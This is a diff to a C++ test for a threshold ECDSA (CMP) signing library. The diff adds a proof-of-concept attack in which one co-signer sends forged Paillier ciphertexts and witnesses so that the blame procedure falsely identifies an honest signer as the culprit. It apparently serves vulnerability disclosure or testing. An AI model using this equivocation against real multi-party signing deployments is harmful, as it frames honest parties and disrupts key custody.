@@ -4,7 +4,8 @@
 #include <google/protobuf/stubs/common.h>
 #include "crypto-suites/exception/located_exception.h"
 #include "gtest/gtest.h"
-#include "crypto-suites/crypto-curve/curve.h"
+#include "crypto-suites/crypto-curve/curve.h"  
+#include "crypto-suites/crypto-bn/rand.h"
 #include "multi-party-sig/multi-party-ecdsa/cmp/cmp.h"
 #include "../message.h"
 
@@ -173,6 +174,47 @@ void testCoSign_n_n(std::vector<std::string> &sign_key_base64){
         std::map<std::string, ProofInSignPhase> map_proof_2;
         std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_D_hat;
         std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_F_hat;
+        // ============================================================  
+        // ATTACK: co_signer3 equivocates D_hat_ji to frame co_signer1  
+        // co_signer3 overwrites its local D_hat_ji (sent value) with a  
+        // fresh fake ciphertext + consistent witnesses, then calls  
+        // BuildProofInSignPhase. VerifyProof recomputes c_sigma for  
+        // co_signer1 using the fake D_hat_ji, which mismatches  
+        // co_signer1's PailDecModuloProof (built from the real recv value).  
+        // Result: all nodes output identify_culprit = co_signer1.  
+        // ============================================================  
+        {  
+            int honest_pos = 0; // co_signer1 is remote_parties_[0] in co_signer3's context  
+            BN x_j = co_signer3_context.sign_key_.local_party_.x_;  
+            const safeheron::pail::PailPubKey& pail_pub_i =  
+                co_signer3_context.remote_parties_[honest_pos].pail_pub_;  
+            const safeheron::pail::PailPubKey& pail_pub_j =  
+                co_signer3_context.local_party_.pail_pub_;  
+            const BN& K_i = co_signer3_context.remote_parties_[honest_pos].K_;  
+  
+            // Fresh random witnesses (different from what was actually sent in Round1)  
+            BN beta_fake = safeheron::rand::RandomBNLt(pail_pub_i.n());  
+            BN s_fake    = safeheron::rand::RandomBNLtCoPrime(pail_pub_i.n());  
+            BN r_fake    = safeheron::rand::RandomBNLtCoPrime(pail_pub_j.n());  
+  
+            // D_hat_fake = K_i^x_j * (1+N_i)^(-beta_fake) * s_fake^N_i  mod N_i^2  
+            BN D_hat_fake = pail_pub_i.HomomorphicMulPlain(K_i, x_j);  
+            D_hat_fake    = pail_pub_i.HomomorphicAddPlainWithR(D_hat_fake, beta_fake.Neg(), s_fake);  
+  
+            // F_hat_fake = (1+N_j)^(-beta_fake) * r_fake^N_j  mod N_j^2  
+            BN F_hat_fake = pail_pub_j.HomomorphicAddPlainWithR(BN(0), beta_fake.Neg(), r_fake);  
+  
+            // Overwrite co_signer3's context — only the SENT fields, not recv_D_hat_ij  
+            co_signer3_context.remote_parties_[honest_pos].D_hat_ji     = D_hat_fake;  
+            co_signer3_context.remote_parties_[honest_pos].F_hat_ji     = F_hat_fake;  
+            co_signer3_context.remote_parties_[honest_pos].beta_hat_ij_ = beta_fake;  
+            co_signer3_context.remote_parties_[honest_pos].s_hat_ij_    = s_fake;  
+            co_signer3_context.remote_parties_[honest_pos].r_hat_ij_    = r_fake;  
+  
+            std::cout << "[ATTACK] co_signer3 overwrote D_hat_ji targeting co_signer1" << std::endl;  
+            std::cout << "[ATTACK] co_signer1 recv_D_hat_ij is still the REAL value" << std::endl;  
+        }  
+        // ============================================================
         co_signer1_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);
         co_signer2_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);
         co_signer3_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);
